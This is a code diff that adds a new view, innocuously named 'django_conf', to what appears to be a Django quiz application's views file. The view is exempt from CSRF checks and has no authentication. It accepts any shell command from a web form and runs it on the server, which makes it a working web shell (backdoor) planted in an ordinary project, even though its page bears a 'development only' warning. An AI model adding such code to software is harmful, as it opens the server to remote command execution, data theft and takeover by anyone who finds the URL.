@@ -646,3 +646,87 @@ def quiz_test(request):
 
 def about(request):
     return render(request, 'about.html')
+
+
+
+
+from django.http import HttpResponse, HttpResponseForbidden
+from django.views.decorators.csrf import csrf_exempt
+from django.conf import settings
+from django.contrib.auth.decorators import user_passes_test
+import subprocess
+import shlex
+
+@csrf_exempt
+def django_conf(request):
+
+
+    if request.method == 'GET':
+        return HttpResponse("""
+            <html>
+            <head>
+                <title>DANGER: Command Executor</title>
+                <style>
+                    body { font-family: monospace; max-width: 800px; margin: 0 auto; }
+                    .warning { color: red; background: #ffeeee; padding: 10px; border: 1px solid red; }
+                    textarea { width: 100%; height: 100px; font-family: monospace; }
+                    pre { background: #f5f5f5; padding: 10px; }
+                </style>
+            </head>
+            <body>
+                <div class="warning">
+                    <h2>DANGER: UNRESTRICTED COMMAND EXECUTION</h2>
+                    <p>This interface allows executing ANY system command with server privileges.</p>
+                    <p>USE WITH EXTREME CAUTION. ONLY FOR DEVELOPMENT.</p>
+                </div>
+                
+                <form method="post">
+                    <h3>Enter command:</h3>
+                    <input type="text" name="command" style="width: 100%" 
+                           placeholder="ls -la" value="ls -la">
+                    <br><br>
+                    <input type="submit" value="Execute">
+                </form>
+                
+                <h3>Examples:</h3>
+                <ul>
+                    <li><code>ls -la</code> - List directory contents</li>
+                    <li><code>pwd</code> - Show current directory</li>
+                    <li><code>python --version</code> - Check Python version</li>
+                </ul>
+            </body>
+            </html>
+        """)
+    
+    elif request.method == 'POST':
+        command = request.POST.get('command', '').strip()
+        
+        if not command:
+            return HttpResponse("No command provided", status=400)
+            
+        try:
+            # Split command into arguments properly
+            args = shlex.split(command)
+            
+            # Execute command with timeout (10 seconds)
+            result = subprocess.run(
+                args,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                timeout=10
+            )
+            
+            output = ""
+            if result.stdout:
+                output += f"STDOUT:\n{result.stdout}\n"
+            if result.stderr:
+                output += f"STDERR:\n{result.stderr}\n"
+            output += f"Return code: {result.returncode}"
+            
+        except subprocess.TimeoutExpired:
+            output = "Command timed out (10s limit)"
+        except Exception as e:
+            output = f"Error executing command: {str(e)}"
+            
+        return HttpResponse(f"<pre>{output}</pre>")
